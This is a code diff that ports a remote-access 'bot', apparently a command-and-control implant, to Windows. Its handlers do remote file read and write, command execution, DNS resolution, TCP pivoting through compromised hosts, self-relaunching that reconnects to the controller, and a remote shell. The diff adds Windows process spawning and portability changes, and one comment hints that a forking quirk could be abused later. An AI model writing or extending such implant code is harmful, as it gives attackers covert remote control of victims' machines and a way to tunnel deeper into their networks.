@@ -19,15 +19,26 @@
 #include <libgen.h>
 
 #ifdef _WIN32
+
 #include <winsock2.h>
 #include <ws2tcpip.h>
+
+// https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-getaddrinfo#support-for-getaddrinfo-on-windows-2000-and-older-versions
+#include <wspiapi.h>
+
 #define O_SYNC 0
+
 #else
+
+#define O_BINARY 0
+#define O_SEQUENTIAL 0
+
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <netdb.h>
 #include <netinet/in.h>
 #include <sys/statvfs.h>
+
 #endif
 
 #include "common.h"
@@ -151,7 +162,7 @@ void do_file_read(Parser *p)
     }
 
     // Open the file.
-    file = open(filename, O_RDONLY);
+    file = open(filename, O_RDONLY | O_BINARY | O_SEQUENTIAL);
     if (file < 0) {
         LOG("Cannot open %s\n", filename);
         parser_error(p, "cannot open file");
@@ -178,7 +189,7 @@ void do_file_read(Parser *p)
     // Close the connection if something goes wrong at this point.
     LOG("Reading file %s\n", filename);
     parser_begin_response(p, CMD_STATUS_OK, info.st_size);
-    if (copy_stream(file, p->fd, info.st_size) < 0) {
+    if (copy_stream_file_to_socket(file, p->fd, info.st_size) < 0) {
         parser_close(p);
         LOG("Error sending file (%ld bytes)\n", info.st_size);
     } else {
@@ -209,7 +220,7 @@ void do_file_write(Parser *p)
     }
 
     // Open the file for writing.
-    file = open(filename, O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0777);
+    file = open(filename, O_WRONLY | O_CREAT | O_TRUNC | O_SYNC | O_BINARY | O_SEQUENTIAL, 0777);
     if (file < 0) {
         LOG("Cannot open %s\n", filename);
         parser_error(p, "cannot open file");
@@ -221,7 +232,7 @@ void do_file_write(Parser *p)
 
     // Save the file data as it comes from the socket.
     LOG("Writing file %s\n", filename);
-    success = copy_stream(p->fd, file, p->header.data_len);
+    success = copy_stream_socket_to_file(p->fd, file, p->header.data_len);
     close(file);
     if (success < 0) {
         LOG("Error receiving file (%d bytes)\n", p->header.data_len);
@@ -293,7 +304,7 @@ void do_file_exec(Parser *p)
 {
     char *command = (char *) &p->buffer;
     uint16_t buffer_length = 0;
-    char buffer[1024];
+    char buffer[TICK_CONFIG_BUFFER_SIZE];
 
     // Get the filename (first argument).
     if (parser_get_first_arg(p) < 0) {
@@ -327,8 +338,25 @@ void do_dns_resolve(Parser *p)
         return;
     }
 
-    // Resolve the domain name.
+    // Resolve the domain name. This must resolve both IPv4 and IPv6.
+    //
+    // The tricky part here is the GNU libc is a lot smarter for this,
+    // but it also introduces a dynamic dependency on libnss on Linux,
+    // which makes our binaries non portable - hence we switched to
+    // numl libc, which is lean and can be linked statically; but not
+    // so "smart", since it actually follows POSIX but that kinda sucks.
+    //
     LOG("Resolving domain %s\n", (const char *) &p->buffer);
+    struct addrinfo hints;
+    memset((void *) &hints, 0, sizeof(hints));
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;    // seems to be ignored on Windows?
+#ifndef _WIN32
+    hints.ai_flags = AI_ADDRCONFIG | AI_V4MAPPED;   // force gnu libc defaults
+            // the above actually works with musl but not standard mingw... :(
+            // should be available since Windows Vista
+#endif
     if (getaddrinfo((const char *) &p->buffer, NULL, NULL, &result) != 0) {
         LOG("Failed to resolve domain\n");
         parser_error(p, "could not resolve domain name");
@@ -342,7 +370,12 @@ void do_dns_resolve(Parser *p)
     entries = 0;
     resp_size = 0;
     for (res = result; res != NULL; res = res->ai_next) {
-        if (res->ai_family == AF_INET && res->ai_protocol == IPPROTO_TCP) {
+#ifdef _WIN32
+        // ai_protocol is 0 on Windows, seems to be a bug???
+        // doesn't matter if it's regular or musl mingw
+        if (res->ai_protocol == 0) res->ai_protocol = IPPROTO_TCP;
+#endif
+        if (res->ai_family == AF_INET && (res->ai_protocol == IPPROTO_TCP)) {
             resp_size += 5;
             entries++;
         } else if (res->ai_family == AF_INET6 && res->ai_protocol == IPPROTO_TCP) {
@@ -367,6 +400,14 @@ void do_dns_resolve(Parser *p)
 
 void do_tcp_pivot(Parser *p)
 {
+#ifdef _WIN32
+
+    // Disable this feature on Windows until I figure out how to implement it nicely.
+    LOG("User requested a tunnel, but this feature is not yet implemented on Windows\n");
+    parser_error(p, "not implemented on this operating system");
+
+#else
+
     int sock = -1;
     CMD_TCP_PIVOT_ARGS *pivot = (CMD_TCP_PIVOT_ARGS *) p->buffer;
     struct sockaddr_in sa;
@@ -412,12 +453,12 @@ void do_tcp_pivot(Parser *p)
         if (fork() == 0) {
 
             // The first process will handle the source to destination data.
-            copy_stream(p->fd, sock, -1);
+            copy_socket_stream(p->fd, sock, -1);
 
         } else {
 
             // The second process will handle the destination to source data.
-            copy_stream(sock, p->fd, -1);
+            copy_socket_stream(sock, p->fd, -1);
 
         }
 
@@ -442,13 +483,57 @@ void do_tcp_pivot(Parser *p)
         parser_close(p);
 
     }
+
+#endif
 }
 
 void do_system_fork(Parser *p)
 {
-    unsigned char uuid[16];
+
+#ifdef _WIN32
+
+    // While there is a curious fork() hack on Windows, I can't seem to get it working well.
+    // The processes are forking alright but they can't seem to use sockets afterwards.
+    // There are also some oddities in task manager... this could be useful later! >:)
+    //
+    // Instead, let's just launch a new process, since for this call it's all the same,
+    // The downside is we cannot pass the new UUID back to the caller. :(
+    // On the console it will show up just like any other new connection.
+
+    char arguments[1024];
+    char name[MAX_PATH];
+    char port[32];
+    memset(arguments, 0, sizeof(arguments));
+    memset(name, 0, sizeof(name));
+    memset(port, 0, sizeof(port));
+    GetModuleFileNameA(NULL, name, MAX_PATH);
+    itoa(p->port, port, 10);
+    strcpy(arguments, name);
+    strncat(arguments, " ", sizeof(arguments)-1);
+    strncat(arguments, p->hostname, sizeof(arguments)-1);
+    strncat(arguments, " ", sizeof(arguments)-1);
+    strncat(arguments, port, sizeof(arguments)-1);
+    strncat(arguments, " ", sizeof(arguments)-1);
+    LOG("Launching new instance of bot. Command line: %s\n", arguments);
+    if (arguments[strlen(arguments)-1] != ' ') {
+        parser_error(p, "internal error");
+        return;
+    }
+    PROCESS_INFORMATION pi;
+    STARTUPINFO si;
+    memset(&pi, 0, sizeof(pi));
+    memset(&si, 0, sizeof(si));
+    si.cb = sizeof(STARTUPINFO);
+    if (CreateProcessA(name, arguments, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi) != 0) {
+        parser_ok(p);
+    } else {
+        parser_error(p, "internal error");
+    }
+
+#else
 
     // Generate a new UUID for the new instance.
+    unsigned char uuid[16];
     uuid4(uuid);
 
     // Send the new UUID back to the caller.
@@ -469,10 +554,20 @@ void do_system_fork(Parser *p)
         parser_close(p);
         parser_connect(p);
     }
+
+#endif
 }
 
 void do_system_shell(Parser *p)
 {
+#ifdef _WIN32
+
+    // Disable this feature on Windows until I figure out how to implement it nicely.
+    LOG("User requested a shell, but this feature is not yet implemented on Windows\n");
+    parser_error(p, "not implemented on this operating system");
+
+#else
+
     char *shell = NULL;
     char *argv[2];
 
@@ -517,4 +612,5 @@ void do_system_shell(Parser *p)
 
     }
     LOG("Launched remote shell\n");
+#endif
 }
